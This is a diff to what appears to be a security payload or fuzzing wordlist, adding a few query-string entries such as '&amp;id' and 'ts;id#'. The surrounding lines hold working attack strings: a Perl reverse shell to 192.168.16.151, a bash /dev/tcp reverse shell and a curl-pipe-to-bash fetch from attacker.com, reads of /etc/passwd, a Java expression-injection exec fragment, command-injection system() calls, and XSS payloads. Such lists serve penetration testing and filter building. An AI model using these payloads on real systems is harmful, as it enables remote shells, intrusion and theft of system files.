@@ -223,6 +223,9 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 && echo "use socket;$i="192.168.16.151";$p=443;socket(s,pf_inet,sock_stream,getprotobyname("tcp"));if(connect(s,sockaddr_in($p,inet_aton($i)))){open(stdin,">&s");open(stdout,">&s");open(stderr,">&s");exec("/bin/sh -i");};" > rev.pl
 && system('curl https://crowdshield.com/.testing/rce_vuln.txt');
 && system('sleep 5');
+&amp;id
+&amp;id=
+&amp;id_currency=
 &id=1;id=2
 &lt;;xml src=";http://ha.ckers.org/xsstest.xml"; id=i&gt;;&lt;;/xml&gt;;
 &lt;xml src=&quot;http://ha.ckers.org/xsstest.xml&quot; id=i&gt;&lt;/xml&gt;
@@ -264,6 +267,7 @@ ${t(org.apache.commons.io.ioutils).tostring(t(java.lang.runtime).getruntime().ex
 3disallow/action=buy&amp;id=
 3disallow/index.php?act=buy&amp;id=&amp;mod=articles
 3disallow/services/questions-answers/?pagen_&amp;id=&amp;tag
+64disallow&amp;id
 ; bash -i >& /dev/tcp/attacker.com/4444 0>&1
 ; cat /etc/passwd
 ; curl http://attacker.com/shell.sh | bash
@@ -3643,6 +3647,7 @@ system(24-12-2013).xml
 system(8-1-2014).xml
 s|ider
 test*; ls -lhtr /var/www/
+ts;id#
 ucweb/2.0 (java; u; midp-2.0; id-id; mozilla) u2/1.0.0 ucbrowser/9.5.0.449 u2/1.0.0 mobile untrusted/1.0 3gpp-gba
 ucweb/2.0 (java; u; midp-2.0; id; bird) u2/1.0.0 ucbrowser/9.3.0.326 u2/1.0.0 mobile untrusted/1.0
 ucweb/2.0 (java; u; midp-2.0; id; generic) u2/1.0.0 ucbrowser/9.4.2.387 u2/1.0.0 mobile
